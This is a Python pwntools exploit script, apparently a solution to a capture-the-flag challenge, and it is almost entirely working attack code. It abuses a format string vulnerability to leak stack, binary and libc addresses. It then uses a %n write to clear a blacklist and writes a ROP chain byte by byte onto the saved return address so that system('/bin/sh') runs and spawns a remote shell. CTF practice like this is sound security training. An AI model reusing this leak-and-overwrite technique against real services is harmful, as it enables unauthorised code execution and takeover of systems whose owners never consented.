#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP
# =========================================================
exe = './chall_patched'
elf = context.binary = ELF(exe, checksec=True)
libc = elf.libc
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-p", "65"]
host, port = 'chall.ctf.k1nd4sus.it', 31001

pid = None

def gdbscript():
    global pid
    gdbscript = f'''
    init-pwndbg
    b * main+461
    c
    '''.format(**locals())
    return gdbscript

def initialize(argv=[]):
    global pid
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript())
    elif args.REMOTE:
        context.log_level = 'info'
        return remote(host, port, ssl=True)
    elif args.DOCKER:

        p = remote("localhost", 5000)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/app/run"]).recvall().strip().decode()
        attach(int(pid), gdbscript=gdbscript(), sysroot=f"/proc/{pid}/root", exe='einstein')
        return p
    else:
        return process([exe] + argv)


# =========================================================
#                         EXPLOITS
# =========================================================

def exploit():
    global io
    
    io = initialize()
    with log.progress("Leaking addresses"), context.silent:
        io.sendline("%a."*100)
        io.recvuntil("enjoy\n")
        leak = io.recvline().strip().split(b"p-1022.")
        stack_leak = int(b"0x" + leak[0].strip(b"0x0."), 16) << 4
        ret = stack_leak + 0x598
        blacklist = stack_leak + 0x7b
        elf.address = int(b"0x" + leak[1].strip(b"0x0."), 16) - 0x2008
        libc.address = (int(b"0x" + leak[15].strip(b"0x0."), 16) << 4) - 0x12c40
        offset = 10
    log.info("Elf base: %#x", elf.address)
    log.info("Libc base: %#x", libc.address)
    log.info("Stack leak: %#x", stack_leak)
    log.info("Ret: %#x", ret)
    log.info("Blacklist: %#x", blacklist)
    with log.progress("Remove the blacklist"), context.silent:
        io.sendline(f"%{offset + 1 + 256//8 + 1}$n".encode().ljust(16, b" ") + b"n"*255 + b" " + p64(blacklist))
        sleep(0.01)
    with log.progress("Overwrite stack ret to ret2system"), context.silent:
        rop = ROP(libc)
        rop.raw(rop.ret.address)
        rop.system(next(libc.search("/bin/sh\0")))
        payload = rop.chain()
        for i in range(len(payload)):
            writes = {ret+i:payload[i]}
            io.sendline(fmtstr_payload(offset, writes, write_size='byte'))
            sleep(0.01)
    with log.progress("Get shell"), context.silent:
        io.sendline("END")
    io.interactive()

if __name__ == '__main__':
   exploit()
